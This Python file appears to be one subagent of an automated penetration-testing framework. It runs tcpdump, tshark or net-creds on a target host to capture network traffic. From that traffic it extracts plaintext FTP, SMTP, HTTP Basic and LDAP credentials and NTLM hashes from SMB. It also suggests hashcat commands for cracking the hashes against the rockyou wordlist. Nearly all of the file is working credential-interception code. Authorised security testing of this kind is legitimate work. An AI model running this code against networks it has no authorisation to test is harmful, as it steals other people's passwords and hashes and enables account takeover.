"""
credential_sniff_subagent.py — Passively sniff network traffic for cleartext credentials.

AGENT_NAME  : "traffic"
SUBAGENT_NAME: "credential_sniff"

Methodology:
  1. Use net-creds / PCredz if available for automated extraction
  2. tcpdump + tshark dissection for FTP, HTTP Basic, Telnet, SMTP, IMAP, POP3, LDAP
  3. Parse for credential patterns: username/password pairs
  4. NTLM hash capture from SMB/HTTP traffic
  5. Kerberos AS-REQ harvesting from captured traffic
  6. Report all credentials with source protocol and endpoint
"""
from __future__ import annotations
import logging, re
from typing import Any
from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

_CRED_RE    = re.compile(r'(user(?:name)?[=:]\s*\S+|pass(?:word)?[=:]\s*\S+|Authorization:\s*Basic\s+\S+)', re.I)
_NTLM_RE    = re.compile(r'(NTLMSSP|NTLMv[12]|Net-NTLMv[12])', re.I)
_KERB_RE    = re.compile(r'(\$krb5asrep\$|\$krb5tgs\$|AS-REQ)', re.I)
_HASH_RE    = re.compile(r'([a-f0-9]{32}:[a-f0-9]{32}|[^:]+::[^:]+:[a-f0-9]{32}:[a-f0-9]{32})', re.I)


class CredentialSniffSubagent(BaseSubagent):
    """Sniff network traffic for cleartext credentials and hashes."""

    AGENT_NAME    = "traffic"
    SUBAGENT_NAME = "credential_sniff"

    async def run(self, target: str, interface: str = "eth0",
                  duration: int = 60,
                  evidence_dir: str = "/tmp/pentest_evidence",
                  **kwargs: Any) -> SubagentResult:
        result = SubagentResult(session_id=self.session_id, subagent_name=self.SUBAGENT_NAME, target=target)

        await self.collect_tool("bash", target,
            {"options": f"-c \"mkdir -p {evidence_dir}/creds\""})

        # ── Check available tools ──────────────────────────────────────
        tools_out = await self.collect_tool("bash", target,
            {"options": "-c \"which net-creds pcredz tshark tcpdump 2>/dev/null\""})

        # ── Preferred: net-creds (automated) ──────────────────────────
        if "net-creds" in tools_out or "pcredz" in tools_out:
            tool = "net-creds" if "net-creds" in tools_out else "pcredz"
            creds_out = await self.collect_tool("bash", target,
                {"options": f"-c \"timeout {duration} {tool} -i {interface} 2>&1 | tee {evidence_dir}/creds/sniffed.txt; echo DONE\""})
            found_creds = _CRED_RE.findall(creds_out)
            ntlm_hashes = _NTLM_RE.findall(creds_out)

            await self.store_finding(Finding(
                title=f"Credential Sniff ({tool}): {len(found_creds)} Credential(s), {len(ntlm_hashes)} NTLM Hash(es)",
                description=f"Automated credential sniffer output. Credentials: {found_creds[:3]}, NTLM: {ntlm_hashes[:2]}",
                severity="CRITICAL" if found_creds or ntlm_hashes else "INFO",
                evidence=creds_out[:800], tool="bash", host=target,
                mitre_technique="T1040",
                exploit_suggestion=f"Crack NTLM: hashcat -m 5600 '{ntlm_hashes[0]}' /usr/share/wordlists/rockyou.txt" if ntlm_hashes else None,
            ))
        else:
            # ── Fallback: tshark dissection ────────────────────────────
            pcap_file = f"{evidence_dir}/creds/sniff_{interface}.pcap"
            cap_out = await self.collect_tool("bash", target,
                {"options": f"-c \"timeout {duration} tcpdump -i {interface} -w {pcap_file} 'port 21 or port 23 or port 25 or port 80 or port 110 or port 143 or port 389 or port 445 or port 8080' -q 2>&1; echo DONE\""})

            if "DONE" in cap_out:
                # HTTP Basic auth
                http_creds = await self.collect_tool("bash", target,
                    {"options": f"-c \"tshark -r {pcap_file} -Y 'http.authorization' -T fields -e ip.src -e http.host -e http.authorization 2>/dev/null\""})
                if http_creds.strip():
                    decoded_pairs = []
                    for line in http_creds.splitlines():
                        parts = line.split('\t')
                        if len(parts) >= 3 and 'Basic' in parts[2]:
                            b64 = parts[2].replace('Basic ', '').strip()
                            decoded_pairs.append(f"{parts[0]} -> {parts[1]}: base64:{b64}")
                    await self.store_finding(Finding(
                        title=f"Credential Sniff: {len(decoded_pairs)} HTTP Basic Auth Credential(s)",
                        description=f"HTTP Basic auth captured:\n" + "\n".join(decoded_pairs[:10]),
                        severity="CRITICAL",
                        evidence=http_creds[:600], tool="bash", host=target,
                        mitre_technique="T1040",
                        exploit_suggestion="Decode: echo '<base64>' | base64 -d",
                    ))

                # FTP credentials
                ftp_creds = await self.collect_tool("bash", target,
                    {"options": f"-c \"tshark -r {pcap_file} -Y 'ftp.request.command == USER or ftp.request.command == PASS' -T fields -e ip.src -e ftp.request.command -e ftp.request.arg 2>/dev/null\""})
                if ftp_creds.strip():
                    await self.store_finding(Finding(
                        title="Credential Sniff: FTP Credentials Captured",
                        description=f"FTP username/password in plaintext:\n{ftp_creds.strip()[:400]}",
                        severity="CRITICAL",
                        evidence=ftp_creds[:500], tool="bash", host=target,
                        mitre_technique="T1040",
                    ))

                # SMTP credentials (AUTH PLAIN/LOGIN)
                smtp_creds = await self.collect_tool("bash", target,
                    {"options": f"-c \"tshark -r {pcap_file} -Y 'smtp.auth.username or smtp.auth.password' -T fields -e ip.src -e smtp.auth.username -e smtp.auth.password 2>/dev/null\""})
                if smtp_creds.strip():
                    await self.store_finding(Finding(
                        title="Credential Sniff: SMTP Authentication Captured",
                        description=f"SMTP credentials:\n{smtp_creds.strip()[:400]}",
                        severity="CRITICAL",
                        evidence=smtp_creds[:400], tool="bash", host=target,
                        mitre_technique="T1040",
                    ))

                # NTLM hashes from SMB
                ntlm_out = await self.collect_tool("bash", target,
                    {"options": f"-c \"tshark -r {pcap_file} -Y 'ntlmssp.auth.username' -T fields -e ip.src -e ntlmssp.auth.domain -e ntlmssp.auth.username -e ntlmssp.auth.nt_response 2>/dev/null | head -20\""})
                if ntlm_out.strip():
                    await self.store_finding(Finding(
                        title="Credential Sniff: NTLM Hashes Captured from SMB",
                        description=f"SMB NTLM challenge-response hashes (crackable):\n{ntlm_out.strip()[:400]}",
                        severity="CRITICAL",
                        evidence=ntlm_out[:600], tool="bash", host=target,
                        mitre_technique="T1040",
                        exploit_suggestion="Format for hashcat -m 5600: <user>::<domain>:<challenge>:<response>",
                    ))

                # LDAP credentials (cleartext bind)
                ldap_out = await self.collect_tool("bash", target,
                    {"options": f"-c \"tshark -r {pcap_file} -Y 'ldap.bindRequest' -T fields -e ip.src -e ldap.name -e ldap.simple 2>/dev/null | head -20\""})
                if ldap_out.strip():
                    await self.store_finding(Finding(
                        title="Credential Sniff: LDAP Plaintext Bind Credentials",
                        description=f"LDAP simple bind with credentials in cleartext:\n{ldap_out.strip()[:400]}",
                        severity="CRITICAL",
                        evidence=ldap_out[:400], tool="bash", host=target,
                        mitre_technique="T1040",
                    ))

                if not any([http_creds.strip(), ftp_creds.strip(), smtp_creds.strip(), ntlm_out.strip()]):
                    await self.store_finding(Finding(
                        title="Credential Sniff: No Plaintext Credentials Captured",
                        description=f"Traffic captured for {duration}s on {interface}. No cleartext credentials detected in common protocols.",
                        severity="INFO",
                        evidence=cap_out[:300], tool="bash", host=target,
                        mitre_technique="T1040",
                    ))

        result.findings    = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result
